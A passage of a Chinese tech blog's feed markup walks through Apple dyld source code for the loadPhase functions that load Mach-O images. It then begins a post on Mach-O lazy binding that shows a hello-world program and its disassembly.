class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">			<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// try raw path</span></span><br><span class="line">	<span class="comment">// 如果上面的环境变量都没有设置，就使用原始地址去加载</span></span><br><span class="line">	<span class="comment">// 函数是loadphase3</span></span><br><span class="line">	image = loadPhase3(path, orgPath, context, exceptions);</span><br><span class="line">	<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">		<span class="keyword">return</span> image;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// try fallback paths during second time (will open file)</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>* fallbackLibraryPaths = sEnv.DYLD_FALLBACK_LIBRARY_PATH;</span><br><span class="line">	<span class="keyword">if</span> ( (fallbackLibraryPaths != <span class="literal">NULL</span>) &amp;&amp; !context.useFallbackPaths )</span><br><span class="line">		fallbackLibraryPaths = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> ( !context.dontLoad  &amp;&amp; (exceptions != <span class="literal">NULL</span>) &amp;&amp; ((sEnv.DYLD_FALLBACK_FRAMEWORK_PATH != <span class="literal">NULL</span>) || (fallbackLibraryPaths != <span class="literal">NULL</span>)) ) &#123;</span><br><span class="line">		image = loadPhase2(path, orgPath, context, sEnv.DYLD_FALLBACK_FRAMEWORK_PATH, fallbackLibraryPaths, exceptions);</span><br><span class="line">		<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">			<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-4_loadPhase2,loadPhase3，loadPhase4">2.4 loadPhase2,loadPhase3，loadPhase4</h2><p>这两个函数纯粹的实现了路径修改的逻辑，通过不同的方式去生成最终的加载路径，逻辑与<code>loadPhase0</code>基本类似，有兴趣可以自行查看代码。</p>
<p><a href="https://github.com/turingH/dyld_soucecode_analysis/blob/master/src/dyld.cpp#L2933" target="_blank" rel="external">LoadPhase2</a></p>
<p><a href="https://github.com/turingH/dyld_soucecode_analysis/blob/master/src/dyld.cpp#L2820" target="_blank" rel="external">LoadPhase3</a></p>
<p><a href="https://github.com/turingH/dyld_soucecode_analysis/blob/master/src/dyld.cpp#L2797" target="_blank" rel="external">LoadPhase4</a></p>
<h2 id="2-5_loadPhase5">2.5 loadPhase5</h2><p><code>loadPhase5</code>根据参数<code>exceptions</code>的不同形成了两个不同的分支。</p>
<ul>
<li>loadPhase5load：通过读取文件，加载文件到内存中，实例化<code>ImageLoader</code>。</li>
<li>loadPhase5check: 通过遍历已经加载的<code>ImageLoader</code>的容器，获取已经加载的<code>ImageLoader</code>。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// open or check existing</span></span><br><span class="line"><span class="comment">// 检测是否有覆盖的，修正path，最后调用loadPhase5Load或者check</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase5</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> <span class="keyword">char</span>* orgPath, <span class="keyword">const</span> LoadContext&amp; context, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;* exceptions)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s, %p)\n", __func__ , path, exceptions);</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// check for specific dylib overrides</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;DylibOverride&gt;::iterator it = sDylibOverrides.begin(); it != sDylibOverrides.end(); ++it) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( <span class="built_in">strcmp</span>(it-&gt;installName, path) == <span class="number">0</span> ) &#123;</span><br><span class="line">			path = it-&gt;override;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( exceptions != <span class="literal">NULL</span> ) </span><br><span class="line">		<span class="keyword">return</span> loadPhase5load(path, orgPath, context, exceptions);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> loadPhase5check(path, orgPath, context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>loadPhase5check</code>的逻辑非常简单，就是遍历容器，取出相同名字的imageLoader对象。有兴趣的可以自己查看<a href="https://github.com/turingH/dyld_soucecode_analysis/blob/master/src/dyld.cpp#L2729" target="_blank" rel="external">loadPhase5check</a>。</p>
<h2 id="2-6_loadPhase5load">2.6 loadPhase5load</h2><p>这里是真正的加载逻辑</p>
<ul>
<li>防止Image改名，在Image的容器里面遍历，检查是否已经加载</li>
<li>在<code>SharedCache</code>寻找是否存在Image的缓存，如果存在的使用<code>ImageLoaderMachO::instantiateFromCache</code>来实例化<code>ImageLoader</code>。</li>
<li>如果上面两个都没有找到的话，就通过<code>loadPhase5open</code>打开文件，并读取到内存。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase5load</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> <span class="keyword">char</span>* orgPath, <span class="keyword">const</span> LoadContext&amp; context, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;* exceptions)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s, %p)\n", __func__ , path, exceptions);</span></span><br><span class="line">	ImageLoader* image = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// just return NULL if file not found, but record any other errors</span></span><br><span class="line">	<span class="keyword">struct</span> stat stat_buf;</span><br><span class="line">	<span class="keyword">if</span> ( my_stat(path, &amp;stat_buf) == -<span class="number">1</span> ) &#123;</span><br><span class="line">		<span class="keyword">int</span> err = errno;</span><br><span class="line">		<span class="keyword">if</span> ( err != ENOENT ) &#123;</span><br><span class="line">			exceptions-&gt;push_back(dyld::mkstringf(<span class="string">"%s: stat() failed with errno=%d"</span>, path, err));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// in case image was renamed or found via symlinks, check for inode match</span></span><br><span class="line">	image = findLoadedImage(stat_buf);</span><br><span class="line">	<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">		<span class="keyword">return</span> image;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// do nothing if not already loaded and if RTLD_NOLOAD or NSADDIMAGE_OPTION_RETURN_ONLY_IF_LOADED</span></span><br><span class="line">	<span class="comment">//RTLD_NOLOAD或者NSADDIMAGE_OPTION_RETURN_ONLY_IF_LOADED字段设置了则不进行加载</span></span><br><span class="line">	<span class="keyword">if</span> ( context.dontLoad )</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> DYLD_SHARED_CACHE_SUPPORT</span></span><br><span class="line">	<span class="comment">// see if this image is in shared cache</span></span><br><span class="line">	<span class="keyword">const</span> macho_header* mhInCache;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>*			pathInCache;</span><br><span class="line">	<span class="keyword">long</span>				slideInCache;</span><br><span class="line">	<span class="comment">// 如果在sharedCacheImage中找到了，则通过cache来加载</span></span><br><span class="line">	<span class="keyword">if</span> ( findInSharedCacheImage(path, <span class="literal">false</span>, &amp;stat_buf, &amp;mhInCache, &amp;pathInCache, &amp;slideInCache) ) &#123;</span><br><span class="line">		image = ImageLoaderMachO::instantiateFromCache(mhInCache, pathInCache, slideInCache, stat_buf, gLinkContext);</span><br><span class="line">		<span class="keyword">return</span> checkandAddImage(image, context);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">// file exists and is not in dyld shared cache, so open it</span></span><br><span class="line">	<span class="comment">// shared_cache中不存在image，则通过LoadPhase5open来加载image</span></span><br><span class="line">	<span class="keyword">return</span> loadPhase5open(path, context, stat_buf, exceptions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-7_loadPhase5open与loadPhase6">2.7  loadPhase5open与loadPhase6</h2><p><code>loadPhase5open</code>只是一个简单的封装。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据路径打开文件</span></span><br><span class="line"><span class="comment">//调用loadPhase6</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase5open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> LoadContext&amp; context, <span class="keyword">const</span> <span class="keyword">struct</span> stat&amp; stat_buf, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;* exceptions)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s, %p)\n", __func__ , path, exceptions);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// open file (automagically closed when this function exits)</span></span><br><span class="line">	<span class="function">FileOpener <span class="title">file</span><span class="params">(path)</span></span>;</span><br><span class="line">		</span><br><span class="line">	<span class="comment">// just return NULL if file not found, but record any other errors</span></span><br><span class="line">	<span class="keyword">if</span> ( file.getFileDescriptor() == -<span class="number">1</span> ) &#123;</span><br><span class="line">		<span class="keyword">int</span> err = errno;</span><br><span class="line">		<span class="keyword">if</span> ( err != ENOENT ) &#123;</span><br><span class="line">			<span class="keyword">const</span> <span class="keyword">char</span>* newMsg = dyld::mkstringf(<span class="string">"%s: open() failed with errno=%d"</span>, path, err);</span><br><span class="line">			exceptions-&gt;push_back(newMsg);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> loadPhase6(file.getFileDescriptor(), stat_buf, path, context);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (<span class="keyword">const</span> <span class="keyword">char</span>* msg) &#123;</span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">char</span>* newMsg = dyld::mkstringf(<span class="string">"%s: %s"</span>, path, msg);</span><br><span class="line">		exceptions-&gt;push_back(newMsg);</span><br><span class="line">		<span class="built_in">free</span>((<span class="keyword">void</span>*)msg);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>做了错误提示之后，调用了<code>loadPhase6</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase6</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">struct</span> stat&amp; stat_buf, <span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> LoadContext&amp; context)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s)\n", __func__ , path);</span></span><br><span class="line">	<span class="keyword">uint64_t</span> fileOffset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">uint64_t</span> fileLength = stat_buf.st_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// validate it is a file (not directory)</span></span><br><span class="line">	<span class="keyword">if</span> ( (stat_buf.st_mode &amp; S_IFMT) != S_IFREG ) </span><br><span class="line">		<span class="keyword">throw</span> <span class="string">"not a file"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span> firstPage[<span class="number">4096</span>];</span><br><span class="line">	<span class="keyword">bool</span> shortPage = <span class="literal">false</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// min mach-o file is 4K</span></span><br><span class="line">	<span class="keyword">if</span> ( fileLength &lt; <span class="number">4096</span> ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( pread(fd, firstPage, fileLength, <span class="number">0</span>) != (<span class="keyword">ssize_t</span>)fileLength )</span><br><span class="line">			throwf(<span class="string">"pread of short file failed: %d"</span>, errno);</span><br><span class="line">		shortPage = <span class="literal">true</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> ( pread(fd, firstPage, <span class="number">4096</span>,<span class="number">0</span>) != <span class="number">4096</span> )</span><br><span class="line">			throwf(<span class="string">"pread of first 4K failed: %d"</span>, errno);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// if fat wrapper, find usable sub-file</span></span><br><span class="line">	<span class="comment">// 如果是一个fat格式的文件，找到对应的子文件</span></span><br><span class="line">	<span class="comment">// 从fat文件中找到对应子文件的代码。</span></span><br><span class="line">	<span class="keyword">const</span> fat_header* fileStartAsFat = (fat_header*)firstPage;</span><br><span class="line">	<span class="keyword">if</span> ( fileStartAsFat-&gt;magic == OSSwapBigToHostInt32(FAT_MAGIC) ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( fatFindBest(fileStartAsFat, &amp;fileOffset, &amp;fileLength) ) &#123;</span><br><span class="line">			<span class="keyword">if</span> ( (fileOffset+fileLength) &gt; (<span class="keyword">uint64_t</span>)(stat_buf.st_size) )</span><br><span class="line">				throwf(<span class="string">"truncated fat file.  file length=%llu, but needed slice goes to %llu"</span>, stat_buf.st_size, fileOffset+fileLength);</span><br><span class="line">			<span class="keyword">if</span> (pread(fd, firstPage, <span class="number">4096</span>, fileOffset) != <span class="number">4096</span>)</span><br><span class="line">				throwf(<span class="string">"pread of fat file failed: %d"</span>, errno);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="string">"no matching architecture in universal wrapper"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// try mach-o loader</span></span><br><span class="line">	<span class="keyword">if</span> ( shortPage ) </span><br><span class="line">		<span class="keyword">throw</span> <span class="string">"file too short"</span>;</span><br><span class="line">	<span class="comment">// 检测运行平台是否正确</span></span><br><span class="line">	<span class="keyword">if</span> ( isCompatibleMachO(firstPage, path) ) &#123;</span><br><span class="line">	</span><br><span class="line">		<span class="comment">// only MH_BUNDLE, MH_DYLIB, and some MH_EXECUTE can be dynamically loaded</span></span><br><span class="line">		<span class="comment">// 只有MH_EXECUTE，MH_DYLIB，MH_BUNDLE三种文件才可被动态加载</span></span><br><span class="line">		<span class="keyword">switch</span> ( ((mach_header*)firstPage)-&gt;filetype ) &#123;</span><br><span class="line">			<span class="keyword">case</span> MH_EXECUTE:</span><br><span class="line">			<span class="keyword">case</span> MH_DYLIB:</span><br><span class="line">			<span class="keyword">case</span> MH_BUNDLE:</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">throw</span> <span class="string">"mach-o, but wrong filetype"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> TARGET_IPHONE_SIMULATOR	</span></span><br><span class="line">	<span class="preprocessor">#<span class="keyword">if</span> TARGET_OS_WATCH || TARGET_OS_TV</span></span><br><span class="line">		<span class="comment">// disable error during bring up of these simulators</span></span><br><span class="line">	<span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">		<span class="comment">// &lt;rdar://problem/14168872&gt; dyld_sim should restrict loading osx binaries</span></span><br><span class="line">		<span class="keyword">if</span> ( !isSimulatorBinary(firstPage, path) ) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="string">"mach-o, but not built for iOS simulator"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// instantiate an image</span></span><br><span class="line">		ImageLoader* image = ImageLoaderMachO::instantiateFromFile(path, fd, firstPage, fileOffset, fileLength, stat_buf, gLinkContext);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// validate</span></span><br><span class="line">		<span class="keyword">return</span> checkandAddImage(image, context);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// try other file formats here...</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// throw error about what was found</span></span><br><span class="line">	<span class="keyword">switch</span> (*(<span class="keyword">uint32_t</span>*)firstPage) &#123;</span><br><span class="line">		<span class="keyword">case</span> MH_MAGIC:</span><br><span class="line">		<span class="keyword">case</span> MH_CIGAM:</span><br><span class="line">		<span class="keyword">case</span> MH_MAGIC_64:</span><br><span class="line">		<span class="keyword">case</span> MH_CIGAM_64:</span><br><span class="line">			<span class="keyword">throw</span> <span class="string">"mach-o, but wrong architecture"</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">		throwf(<span class="string">"unknown file type, first eight bytes: 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X"</span>, </span><br><span class="line">			firstPage[<span class="number">0</span>], firstPage[<span class="number">1</span>], firstPage[<span class="number">2</span>], firstPage[<span class="number">3</span>], firstPage[<span class="number">4</span>], firstPage[<span class="number">5</span>], firstPage[<span class="number">6</span>],firstPage[<span class="number">7</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>做了Fat格式的检测，子类型文件提取。</li>
<li>检测Mach-O类型，只有<code>MH_EXECUTE</code>，<code>MH_DYLIB</code>，<code>MH_BUNDLE</code>三种文件才可被动态加载。</li>
<li>通过<code>ImageLoaderMachO::instantiateFromFile</code>生成<code>ImageLoader</code>的实例。</li>
</ul>
<h1 id="0x03_小结">0x03 小结</h1><p><code>Load</code>的函数调用流程就是一系列的loadPhase*函数的调用，在<code>load</code>最后都会通过ImageLoader的构造函数，实例化ImageLoader，接下来 就需要分析ImageLoader的几个不同的构造函数。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>在<code>OS X</code>或者<code>IOS</code>上运行一个程序时，dyld除了需要加载主要的执行程序之外，还需要加载需要的库文件以及库文件依赖的库文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// instantiate ImageLoader for main executable</span></span><br><span class="line">sMainExecutable = instantiateFromLoadedImage(mainExecutableMH, mainExecutableSlide, sExecPath);<span class="comment">//加载MACHO到image</span></span><br></pre></td></tr></table></figure>
<p>这一条函数调用加载了需要运行的程序，具体详细分析可以参考<a href="http://BLOGIMAGE/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">dyld中mach-o文件加载的简单分析</a>。</p>
<p>而在<code>link</code>主程序之前还会动态的加载一些其他的库文件。例如<code>DYLD_INSERT_LIBRARIES</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// load any inserted libraries</span></span><br><span class="line"><span class="comment">// 类似于linux里面的LD_PRELOAD</span></span><br><span class="line"><span class="keyword">if</span>	( sEnv.DYLD_INSERT_LIBRARIES != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>* lib = sEnv.DYLD_INSERT_LIBRARIES; *lib != <span class="literal">NULL</span>; ++lib) </span><br><span class="line">		loadInsertedDylib(*lib); <span class="comment">//!!!动态加载dylib</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// record count of inserted libraries so that a flat search will look at </span></span><br><span class="line"><span class="comment">// inserted libraries, then main, then others.</span></span><br><span class="line">sInsertedDylibCount = sAllImages.size()-<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p><code>loadInsertedDylib</code>的实现其实就是简单的调用<code>load</code>函数。通过简单的分析<code>load</code>函数，增强对dyld工作流程的理解。</p>]]>
    
    </summary>
    
      <category term="dlopen" scheme="http://turingh.github.io/tags/dlopen/"/>
    
      <category term="dyld" scheme="http://turingh.github.io/tags/dyld/"/>
    
      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
    
      <category term="osx" scheme="http://turingh.github.io/tags/osx/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Mach-O的动态链接相关知识]]></title>
    <link href="http://turingh.github.io/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
    <id>http://turingh.github.io/2016/03/10/Mach-O的动态链接/</id>
    <published>2016-03-10T16:40:02.000Z</published>
    <updated>2016-03-24T03:37:40.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>通过分析<code>Mach-O</code>的动态链接过程，加深对<code>Mach-O</code>文件结构的理解。对Mach-O文件格式的简单的分析看这里<a href="http://BLOGIMAGE/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/" target="_blank" rel="external">这里</a>。</p>
<a id="more"></a>
<h1 id="0x01_Mach-O_Lazy_Bind">0x01 Mach-O Lazy Bind</h1><p>Mach-O文件的通过dyld加载的时候并没有确定每一个函数的具体地址在哪里，而是在真正调用该函数的时候通过<strong>过程连接表</strong>(procedure linkage table)，后面简称PLT，来进行一次<strong>lazybind</strong>。</p>
<p>结合Mach-O文件的分析与代码的调试简单的分析一下，只能算是管中窥豹了。</p>
<p>源码很简单。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">// insert code here...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello, World!\n"</span>);</span><br><span class="line">  	<span class="built_in">printf</span>(<span class="string">"2Hello, World!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分别在两个printf函数处下断点，启动程序。</p>
<h2 id="1-1_第一次调用prinf">1.1 第一次调用prinf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lazy_bind`main:</span><br><span class="line">    <span class="number">0x100000f10</span> &lt;+<span class="number">0</span>&gt;:  pushq  %rbp</span><br><span class="line">    <span class="number">0x100000f11</span> &lt;+<span class="number">1</span>&gt;:  movq   %rsp, %rbp</span><br><span class="line">    <span class="number">0x100000f14</span> &lt;+<span class="number">4</span>&gt;:  subq   $<span class="number">0x20</span>, %rsp</span><br><span class="line">    <span class="number">0x100000f18</span> &lt;+<span class="number">8</span>&gt;:  leaq   <span class="number">0x57</span>(%rip), %rax          ; <span class="string">"Hello, World!\n"</span></span><br><span class="line">    <span class="number">0x100000f1f</span> &lt;+<span class="number">15</span>&gt;: movl   $<span class="number">0x0</span>, -<span class="number">0x4</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f26</span> &lt;+<span class="number">22</span>&gt;: movl   %edi, -<span class="number">0x8</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f29</span> &lt;+<span class="number">25</span>&gt;: movq   %rsi, -<span class="number">0x10</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f2d</span> &lt;+<span class="number">29</span>&gt;: movq   %rax, %rdi</span><br><span class="line">    <span class="number">0x100000f30</span> &lt;+<span class="number">32</span>&gt;: movb   $<span class="number">0x0</span>, %al</span><br><span class="line">-&gt;  <span class="number">0x100000f32</span> &lt;+<span class="number">34</span>&gt;: callq  <span class="number">0x100000f56</span>               ; symbol stub <span class="keyword">for</span>: <span 